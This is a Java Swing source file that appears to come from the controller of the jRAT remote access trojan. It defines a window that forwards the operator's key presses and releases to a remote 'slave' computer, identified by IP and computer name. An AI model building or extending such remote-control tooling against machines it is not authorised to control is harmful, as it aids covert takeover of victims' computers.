package pro.jrat.client.ui.frames;

import java.awt.BorderLayout;
import java.awt.Toolkit;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.HashMap;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextPane;
import javax.swing.JToggleButton;
import javax.swing.ScrollPaneConstants;
import javax.swing.border.EmptyBorder;

import pro.jrat.client.packets.outgoing.Packet94KeyPress;
import pro.jrat.client.packets.outgoing.Packet95KeyRelease;

@SuppressWarnings("serial")
public class FrameRemoteScreenKeyboard extends BaseFrame {

	private JPanel contentPane;
	private FrameRemoteScreen frame;

	public static HashMap<FrameRemoteScreen, FrameRemoteScreenKeyboard> instances = new HashMap<FrameRemoteScreen, FrameRemoteScreenKeyboard>();
	private JTextPane txt;
	private JToggleButton button;

	public FrameRemoteScreenKeyboard(FrameRemoteScreen f) {
		super();
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteScreenKeyboard.class.getResource("/icons/keyboard.png")));
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});
		this.frame = f;
		instances.put(frame, this);
		setTitle("Keyboard - Remote Screen - " + f.slave.getIP() + " - " + f.slave.getComputerName());
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 450, 300);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		contentPane.setLayout(new BorderLayout(0, 0));
		setContentPane(contentPane);

		JScrollPane panel = new JScrollPane();
		panel.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
		panel.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		contentPane.add(panel, BorderLayout.CENTER);

		txt = new JTextPane();
		panel.setViewportView(txt);

		JPanel panel_1 = new JPanel();
		contentPane.add(panel_1, BorderLayout.SOUTH);

		button = new JToggleButton("Listen for input");
		button.setSelected(true);
		button.setIcon(new ImageIcon(FrameRemoteScreenKeyboard.class.getResource("/icons/keyboard_arrow.png")));
		GroupLayout gl_panel_1 = new GroupLayout(panel_1);
		gl_panel_1.setHorizontalGroup(gl_panel_1.createParallelGroup(Alignment.LEADING).addComponent(button, GroupLayout.DEFAULT_SIZE, 424, Short.MAX_VALUE));
		gl_panel_1.setVerticalGroup(gl_panel_1.createParallelGroup(Alignment.LEADING).addComponent(button, GroupLayout.DEFAULT_SIZE, 34, Short.MAX_VALUE));
		panel_1.setLayout(gl_panel_1);

		txt.addKeyListener(new KeyAdapter() {
			@Override
			public void keyPressed(KeyEvent arg0) {
				if (button.isSelected()) {
					frame.slave.addToSendQueue(new Packet94KeyPress(arg0.getKeyCode()));
				}
			}

			@Override
			public void keyReleased(KeyEvent arg0) {
				if (button.isSelected()) {
					frame.slave.addToSendQueue(new Packet95KeyRelease(arg0.getKeyCode()));
				}
			}
		});
	}

	public void exit() {
		instances.remove(frame);
	}
}
